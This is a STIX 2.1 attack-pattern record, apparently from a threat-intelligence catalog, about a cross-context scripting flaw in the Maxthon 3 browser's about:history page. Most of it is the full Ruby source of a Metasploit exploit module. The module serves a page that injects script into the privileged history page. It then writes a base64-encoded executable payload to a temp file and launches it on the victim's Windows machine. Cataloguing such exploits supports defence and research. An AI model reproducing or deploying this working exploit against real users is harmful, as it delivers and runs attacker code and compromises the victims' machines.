{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3f044d81-0254-4e9f-bc9e-caf0d04ce305",
    "created": "2024-08-14T16:44:25.927376Z",
    "modified": "2024-08-14T16:44:25.92738Z",
    "name": "Maxthon3 about:history XCS Trusted Zone Code Execution",
    "description": " Cross Context Scripting (XCS) is possible in the Maxthon about:history page. Injection in such privileged/trusted browser zone can be used to modify configuration settings and execute arbitrary commands.  Please note this module only works against specific versions of XCS. Currently we've only successfully tested on Maxthon 3.1.7 build 600 up to 3.2.2 build 1000.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/maxthon_history_xcs.rb",
            "external_id": "maxthon_history_xcs.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Maxthon3 about:history XCS Trusted Zone Code Execution',\n      'Description'    => %q{\n        Cross Context Scripting (XCS) is possible in the Maxthon about:history page.\n        Injection in such privileged/trusted browser zone can be used to modify\n        configuration settings and execute arbitrary commands.\n\n        Please note this module only works against specific versions of XCS. Currently,\n        we've only successfully tested on Maxthon 3.1.7 build 600 up to 3.2.2 build 1000.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Roberto Suggi Liverani', # Discovered the vulnerability and developed msf module\n          'sinn3r', # msf module\n          'juan vazquez' # msf module\n        ],\n      'References' =>\n        [\n          ['OSVDB', '88191'],\n          ['EDB', '23225'],\n          ['URL', 'http://blog.malerisch.net/2012/12/maxthon-cross-context-scripting-xcs-about-history-rce.html']\n        ],\n      'Payload' =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets' =>\n        [\n          ['Maxthon 3 (prior to 3.3) on Windows', {} ]\n        ],\n      'DisclosureDate' => '2012-11-26',\n      'DefaultTarget'  => 0\n    ))\n  end\n\n  def on_request_uri(cli, request)\n    if request.headers['User-Agent'] !~ /Maxthon\\/3/ or request.headers['User-Agent'] !~ /AppleWebKit\\/534.12/\n      print_status(\"Sending 404 for User-Agent #{request.headers['User-Agent']}\")\n      send_not_found(cli)\n      return\n    end\n\n    html_hdr = %Q|\n    <html>\n    <head>\n    <title>Loading</title>\n    |\n\n    html_ftr = %Q|\n    </head>\n    <body >\n    <h1>Loading</h1>\n    </body></html>\n    |\n\n    case request.uri\n      when /\\?jspayload/\n        p = regenerate_payload(cli)\n        if (p.nil?)\n          send_not_found(cli)\n          return\n        end\n        # We're going to run this through unescape(), so make sure\n        # everything is encoded\n        penc = generate_payload_exe\n        penc2 = Rex::Text.encode_base64(penc)\n\n        # now this is base64 encoded payload which needs to be passed to the file write api in maxthon.\n        # Then file can be launched via Program DOM API, because of this only Maxthon 3.1 versions are targeted.\n        # The Program DOM API isn't available on Maxthon 3.2 and upper versions.\n        content = %Q|\n        if(maxthon.program)\n        {\n        var fileTemp = new maxthon.io.File.createTempFile(\"test\",\"exe\");\n        var fileObj = maxthon.io.File(fileTemp);\n        maxthon.io.FileWriter(fileTemp);\n        maxthon.io.writeDataURL(\"data:application/x-msdownload;base64,#{penc2}\");\n        maxthon.program.Program.launch(fileTemp.name_,\"C:\");\n        }\n        |\n\n      when /\\?history/\n        js = %Q|\n        window.onload = function() {\n          location.href = \"about:history\";\n        }\n        |\n\n        content = %Q|\n        #{html_hdr}\n        <script>\n        #{js}\n        </script>\n        #{html_ftr}\n        |\n\n      when get_resource()\n        print_status(\"Sending #{self.name} payload for request #{request.uri}\")\n\n        js = %Q|\n        url = location.href;\n        url2 = url + \"?jspayload=1\";\n        inj = \"?history#%22/><img src=a onerror=%22\"\n        inj_1 = \"a=document.createElement('script');a.setAttribute('src','\"+url2+\"');document.body.appendChild(a);\";\n        window.location = unescape(inj) + inj_1;\n        |\n\n        content = %Q|\n        #{html_hdr}\n        <script>\n        #{js}\n        </script>\n        #{html_ftr}\n        |\n      else\n        print_status(\"Sending 404 for request #{request.uri}\")\n        send_not_found(cli)\n        return\n    end\n\n    send_response_html(cli, content)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-26",
    "x_mitre_platforms": [
        "win'"
    ]
}